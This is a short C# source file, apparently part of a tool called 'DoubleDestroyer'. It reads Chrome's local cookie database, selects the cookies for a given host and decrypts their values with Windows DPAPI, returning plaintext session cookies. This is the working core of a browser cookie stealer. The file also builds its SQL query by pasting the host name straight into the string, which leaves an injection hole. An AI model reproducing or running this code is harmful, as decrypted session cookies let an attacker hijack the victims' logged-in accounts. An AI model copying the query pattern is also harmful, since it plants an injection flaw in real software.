﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DoubleDestroyer
{
    public class ChromeCookieReader
    {
        internal static IEnumerable<Tuple<string, string>> ReadCookies(string hostName)
        {
            List<Tuple<string, string>> lCookies = new List<Tuple<string, string>>();

            if (hostName == null) throw new ArgumentNullException("hostName");

            var dbPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
            if (!System.IO.File.Exists(dbPath)) throw new System.IO.FileNotFoundException("Cant find cookie store", dbPath); // race condition, but i'll risk it

            var connectionString = "Data Source=" + dbPath + ";pooling=false";

            System.Data.SQLite.SQLiteConnection.ClearAllPools();

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = "SELECT name,encrypted_value FROM cookies WHERE host_key LIKE '%" + hostName + "%'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var encryptedData = (byte[])reader[1];
                        var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                        var plainText = Encoding.ASCII.GetString(decodedData); // Looks like ASCII

                        lCookies.Add(new Tuple<string, string>(reader.GetString(0), plainText));
                    }
                }
                conn.Close();
            }
            
            return lCookies;
        }
    }
}
